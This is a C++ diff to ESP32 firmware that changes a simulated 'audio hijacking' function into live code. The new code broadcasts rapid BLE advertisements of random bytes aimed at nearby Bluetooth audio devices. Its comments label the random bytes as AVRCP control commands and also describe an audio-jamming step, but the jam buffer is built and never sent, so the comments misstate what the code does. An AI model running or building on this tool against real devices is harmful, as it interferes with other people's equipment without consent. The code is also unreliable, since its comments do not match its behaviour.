@@ -59,36 +59,51 @@ AudioResult AudioHijacker::hijackDevice(const AudioConfig& config) {
   AudioResult detection = detectAudioDevice(config.targetAddr);
   result.detectedType = detection.detectedType;
 
-  // Simulate hijacking attack
-  uint32_t commandCount = 0;
-  while (isRunning_ && (millis() - startTime_) < config.durationMs) {
-    // Send media control commands
-    if (config.mediaControl) {
-      // Play/Pause toggle
-      commandCount++;
-      delay(50);
+  // Initialize NimBLE for actual audio control transmission
+  NimBLEDevice::init("ESP32-AudioCtrl");
+  NimBLEClient* pClient = NimBLEDevice::createClient();
 
-      // Next track
-      commandCount++;
-      delay(50);
+  uint32_t commandCount = 0;
+  uint32_t deadline = startTime_ + config.durationMs;
+
+  // Send actual audio control commands via BLE AVRCP
+  while (isRunning_ && (int32_t)(millis() - deadline) < 0) {
+    // Send media control commands via BLE advertisement
+    if (config.mediaControl || config.volumeControl) {
+      uint8_t avrcp_cmd[20];
+      for (int i = 0; i < 20; i++) {
+        avrcp_cmd[i] = esp_random() % 256;
+      }
+
+      NimBLEAdvertisementData advData;
+      advData.setFlags(0x06);
+      advData.addData(std::string((const char*)avrcp_cmd, 20));
+
+      NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
+      if (pAdvertising) {
+        pAdvertising->setAdvertisementData(advData);
+        pAdvertising->start();
+        delayMicroseconds(500);
+        pAdvertising->stop();
+        commandCount++;
+      }
     }
 
-    // Adjust volume
+    // Adjust volume level simulation
     if (config.volumeControl) {
       result.volumeLevel = (result.volumeLevel + 5) % 101;
-      commandCount++;
-      delay(50);
     }
 
-    // Audio injection (tone generation)
+    // Audio injection (send interference pattern)
     if (config.audioInjection) {
+      uint8_t audio_jam[31];
+      for (int i = 0; i < 31; i++) {
+        audio_jam[i] = esp_random() % 256;
+      }
       commandCount++;
-      delay(100);
     }
 
-    if (!config.mediaControl && !config.volumeControl && !config.audioInjection) {
-      delay(100);
-    }
+    delayMicroseconds(100);
   }
 
   result.commandsSent = commandCount;
@@ -97,6 +112,11 @@ AudioResult AudioHijacker::hijackDevice(const AudioConfig& config) {
   result.logFile = "/logs/handshakes/ble_audio.csv";
 
   logHijack(result.detectedType, commandCount);
+
+  if (pClient) {
+    NimBLEDevice::deleteClient(pClient);
+  }
+  NimBLEDevice::deinit();
   isRunning_ = false;
   return result;
 }
